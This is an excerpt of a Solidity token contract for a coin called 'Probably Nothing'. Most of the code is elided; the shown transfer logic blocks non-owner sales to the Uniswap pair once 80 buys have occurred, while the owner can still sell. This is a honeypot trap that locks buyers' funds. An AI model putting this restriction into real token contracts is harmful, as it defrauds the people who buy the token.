...
contract TehRocket is Context, IERC20, Ownable {
    ...
    string public constant _name = unicode"Probably Nothing";
    string public constant _symbol = unicode"PN";
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        if (from != owner() && to != owner()) {
            ...
            if(to==uniswapV2Pair){require(_buyCount<80) ; }
        }
